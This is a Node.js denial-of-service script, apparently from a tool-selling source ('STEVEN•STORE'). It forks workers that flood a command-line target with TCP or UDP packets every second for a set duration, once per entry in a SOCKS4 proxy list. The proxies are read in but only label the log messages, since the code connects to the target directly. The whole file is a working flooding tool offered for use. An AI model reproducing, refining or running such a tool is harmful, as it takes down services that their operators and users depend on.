//Method By STEVEN•STORE🕊🪽
const net = require("net");
const dgram = require("dgram");
const cluster = require("cluster");
const fs = require("fs");

const args = {
	target: process.argv[2],
	time: Number(process.argv[3]) * 1000, // Convert to milliseconds
	threads: Number(process.argv[4]),
	payload: process.argv[5] || "Hello, server!", // Default payload if not specified
	method: process.argv[6] || "tcp", // Default method is tcp, you can specify "udp" to use UDP method
	port: Number(process.argv[7]) || 80, // Default port is 80, you can specify any other port
};

function createTCPSocket(proxy) {
	const socket = new net.Socket();

	socket.on("error", (err) => {
		// Handle errors here
		console.error(`[${proxy}] TCP Socket error:`, err.message);
		socket.destroy();
	});

	return socket;
}

function createUDPSocket(proxy) {
	const socket = dgram.createSocket("udp4");

	socket.on("error", (err) => {
		// Handle errors here
		console.error(`[${proxy}] UDP Socket error:`, err.message);
		socket.close();
	});

	return socket;
}

function getProxyList() {
	const proxyList = fs.readFileSync("socks4.txt", "utf-8").toString().split(/\r?\n/);
	return proxyList.filter((proxy) => proxy.trim() !== "");
}

function attack() {
	const proxyList = getProxyList();
	const message = Buffer.from(args.payload);

	setInterval(() => {
		for (const proxy of proxyList) {
			if (args.method === "udp") {
				const socket = createUDPSocket(proxy);
				socket.send(message, 0, message.length, args.port, args.target, (err) => {
					if (err) {
						console.error(`[${proxy}] UDP Send error:`, err.message);
					}
				});
			} else {
				const socket = createTCPSocket(proxy);
				socket.connect(args.port, args.target, () => {
					socket.write(message, () => {
						socket.destroy();
					});
				});
			}
		}
	}, 1000); // Sending packets every 1000ms (1 second)
}

if (cluster.isMaster) {
	for (let counter = 1; counter <= args.threads; counter++) {
		cluster.fork();
	}
} else {
	attack();
}

setTimeout(() => {
	// Stop the attack after the specified time
	console.log("Attack finished.");
	process.exit(0);
}, args.time);
